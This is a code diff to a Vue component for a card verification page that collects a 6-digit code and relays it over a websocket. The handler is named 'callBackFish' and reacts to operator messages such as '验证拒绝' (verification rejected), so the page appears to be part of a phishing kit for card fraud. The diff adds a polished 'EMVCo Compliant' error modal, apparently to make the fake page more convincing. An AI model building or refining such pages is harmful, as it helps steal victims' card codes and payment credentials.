@@ -58,7 +58,7 @@
                   type="text"
                   placeholder="Enter 6-digit code"
                   maxlength="6"
-                  class="w-full h-12 sm:h-14 text-center text-lg sm:text-xl tracking-widest font-medium border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent px-4"
+                  class="w-full h-12 sm:h-14 text-center text-base sm:text-base tracking-widest font-base border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent px-4"
                   required
               />
             </div>
@@ -68,7 +68,7 @@
               <button
                   type="submit"
                   :disabled="cardInfo.code?.length !== 6 || isSubmitting"
-                  class="w-full h-12 sm:h-14 bg-green-600 hover:bg-green-700 text-white rounded-md disabled:opacity-50 disabled:cursor-not-allowed transition-colors font-medium"
+                  class="w-full h-12 sm:h-14 bg-green-600 hover:bg-green-700 text-white rounded-md disabled:opacity-50 disabled:cursor-not-allowed transition-colors font-normal"
               >
                 {{ isSubmitting ? 'VERIFYING...' : 'SUBMIT' }}
               </button>
@@ -77,7 +77,7 @@
                   type="button"
                   @click="handleResendCode"
                   :disabled="countdown > 0"
-                  class="w-full h-12 sm:h-14 border border-gray-300 text-gray-700 hover:bg-gray-50 rounded-md disabled:opacity-50 disabled:cursor-not-allowed transition-colors font-medium bg-white"
+                  class="w-full h-12 sm:h-14 border border-gray-300 text-gray-700 hover:bg-gray-50 rounded-md disabled:opacity-50 disabled:cursor-not-allowed transition-colors font-normal bg-white"
               >
                 {{ countdown > 0 ? `RESEND CODE (${countdown}s)` : 'RESEND CODE' }}
               </button>
@@ -142,11 +142,70 @@
         </div>
       </div>
     </div>
+
+    <!-- Error Modal - EMVCo Compliant -->
+    <Teleport to="body">
+      <transition name="modal-fade">
+        <div
+            v-if="showError"
+            class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50"
+            @click.self="closeErrorModal"
+        >
+          <div class="bg-white rounded-lg shadow-xl p-6 w-full max-w-md transform transition-all">
+            <div class="flex flex-col items-center text-center space-y-4">
+              <!-- Error Icon -->
+              <div class="flex-shrink-0 w-16 h-16 bg-red-100 rounded-full flex items-center justify-center">
+                <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    width="32"
+                    height="32"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    class="text-red-600"
+                    aria-hidden="true"
+                >
+                  <circle cx="12" cy="12" r="10"></circle>
+                  <line x1="12" y1="8" x2="12" y2="12"></line>
+                  <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                </svg>
+              </div>
+
+              <!-- Error Content -->
+              <div class="space-y-2">
+                <h3 class="text-lg sm:text-xl font-semibold text-gray-900">
+                  Verification failed
+                </h3>
+                <p class="text-sm sm:text-base text-gray-600 max-w-sm">
+                  The code you entered is incorrect. Please check your message and try again, or request a new code.
+                </p>
+              </div>
+
+              <!-- Action Button -->
+              <div class="w-full pt-2">
+                <UButton
+                    color="green"
+                    size="lg"
+                    block
+                    @click="closeErrorModal"
+                    class="h-12 sm:h-14"
+                >
+                  Try again
+                </UButton>
+              </div>
+            </div>
+          </div>
+        </div>
+      </transition>
+    </Teleport>
   </div>
 </template>
 
 <script setup lang="ts">
-import { ref, watch,computed ,onBeforeUnmount, onMounted } from 'vue';
+import { ref, watch, onBeforeUnmount, onMounted } from 'vue';
 import { addOnMessage, removeOnMessage, sendMsg } from '~/utils';
 import type { WebSocketMessage } from '~/utils';
 import {useLoadingStore} from "~/stores/loading";
@@ -162,6 +221,7 @@ const isSubmitting = ref(false);
 const isExpanded = ref(false);
 const countdown = ref(0);
 const cardInfo = ref({});
+const showError = ref(false);
 
 // Countdown Timer Watcher
 watch(countdown, (newValue) => {
@@ -204,8 +264,8 @@ const callBackFish = (res: WebSocketMessage) => {
   }else if(res.data.action == "验证拒绝"){
     isSubmitting.value = false;
     cardInfo.value['code'] = ''
-    // 提交失败，提示用户
-    alert("Verification failed. Please try again.");
+    // 提交失败，提示用户 - EMVCo Compliant Modal Display
+    showError.value = true;
   }
   console.log("callBackFish：",res)
 };
@@ -218,7 +278,13 @@ const handleResendCode = () => {
     message: cardInfo.value,
   });
   countdown.value = 60;
+  // 清除错误提示
+  showError.value = false;
+};
 
+// Close Error Modal
+const closeErrorModal = () => {
+  showError.value = false;
 };
 
 onMounted(() => {
@@ -260,5 +326,27 @@ onBeforeUnmount(() => {
 .expand-leave-from {
   max-height: 384px;
   opacity: 1;
+}
+
+/* Modal Transition */
+.modal-fade-enter-active,
+.modal-fade-leave-active {
+  transition: opacity 0.3s ease;
+}
+
+.modal-fade-enter-active > div,
+.modal-fade-leave-active > div {
+  transition: transform 0.3s ease, opacity 0.3s ease;
+}
+
+.modal-fade-enter-from,
+.modal-fade-leave-to {
+  opacity: 0;
+}
+
+.modal-fade-enter-from > div,
+.modal-fade-leave-to > div {
+  transform: scale(0.95);
+  opacity: 0;
 }
 </style>
